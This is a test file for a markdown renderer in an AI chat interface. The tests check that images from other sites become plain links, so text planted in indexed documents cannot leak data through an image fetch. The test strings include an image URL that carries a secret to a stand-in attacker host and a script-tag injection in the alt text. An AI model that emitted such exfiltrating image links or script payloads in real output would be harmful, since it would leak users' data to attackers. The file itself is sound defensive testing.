import { describe, expect, it } from "vitest";
import { renderMarkdown } from "./markdown";

const origin = window.location.origin;

describe("renderMarkdown images", () => {
	it("does not render an image the site does not serve", () => {
		// an <img> here fetches on render, with no click: the answer's text reaches the agent
		// from indexed documents, so this would be a way out for anything planted in them
		const out = renderMarkdown("![a chart](https://evil.example/p.png?q=secret)");
		expect(out).not.toContain("<img");
		expect(out).toContain('<a href="https://evil.example/p.png?q=secret"');
		expect(out).toContain('rel="noopener noreferrer"');
		expect(out).toContain(">a chart</a> (image on evil.example)");
	});

	it("names the link Image when the image has no alt text", () => {
		expect(renderMarkdown("![](https://evil.example/p.png)")).toContain(
			">Image</a> (image on evil.example)",
		);
	});

	it("does not render a protocol-relative image", () => {
		const out = renderMarkdown("![x](//evil.example/p.png)");
		expect(out).not.toContain("<img");
		expect(out).toContain("(image on evil.example)");
	});

	it("shows a data or empty src as text, with nothing to open", () => {
		expect(renderMarkdown("![x](data:image/gif;base64,R0lGODlhAQABAAAAACw=)")).toBe(
			'<p><span class="frappe-ai-noimage">x</span></p>\n',
		);
		expect(renderMarkdown("![](data:image/gif;base64,R0lGODlhAQABAAAAACw=)")).toContain(
			"Image unavailable",
		);
		expect(renderMarkdown("![x]()")).not.toContain("<img");
	});

	it("escapes the alt text and the address it shows instead", () => {
		const out = renderMarkdown('![<script>alert("x")</script>](https://evil.example/p.png)');
		expect(out).not.toContain("<script>");
		expect(out).toContain("&lt;script&gt;");
	});

	it("renders an image this site serves", () => {
		for (const src of [
			"/files/chart.png",
			"/private/files/chart.png",
			`${origin}/files/c.png`,
		]) {
			const out = renderMarkdown(`![a chart](${src})`);
			expect(out).toContain("<img");
			expect(out).toContain(`src="${src}"`);
			expect(out).toContain('alt="a chart"');
		}
	});

	it("does not render a reference-style image from another site", () => {
		const out = renderMarkdown("![a chart][ref]\n\n[ref]: https://evil.example/p.png");
		expect(out).not.toContain("<img");
		expect(out).toContain("(image on evil.example)");
	});
});
